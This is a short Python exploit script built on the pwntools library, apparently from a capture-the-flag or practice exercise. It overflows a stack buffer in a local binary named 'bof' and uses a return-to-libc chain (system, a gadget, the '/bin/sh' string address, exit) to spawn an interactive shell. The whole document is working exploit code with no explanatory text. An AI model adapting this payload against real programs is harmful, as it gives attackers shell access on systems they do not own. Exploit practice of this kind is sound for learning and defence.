from pwn import *

target = process("./bof")

#plt
system_plt = 0x8048380
exit_plt = 0x8048390

#addr
binsh_off = 0x17b8cf
libc_base = 0xf7dd9000
binsh_addr = libc_base + binsh_off

rop_1 = 0x0804834d

_ = target.readline()
_ = target.readline()

payload = b"A" * 42
payload += p32(system_plt)
payload += p32(rop_1)
payload += p32(binsh_addr)
payload += p32(exit_plt)
payload += b"BBBB"
payload += b"\x02"

target.sendline(payload)

target.interactive()
